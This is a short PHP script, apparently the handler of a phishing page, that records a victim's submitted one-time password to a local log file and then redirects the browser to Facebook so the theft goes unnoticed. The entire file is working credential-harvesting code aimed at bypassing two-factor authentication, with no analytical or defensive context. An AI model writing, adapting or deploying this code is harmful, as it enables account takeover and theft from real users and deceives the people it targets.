<?php

    file_put_contents("log.txt", "OTP: " . $_POST['otp'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com/');
exit();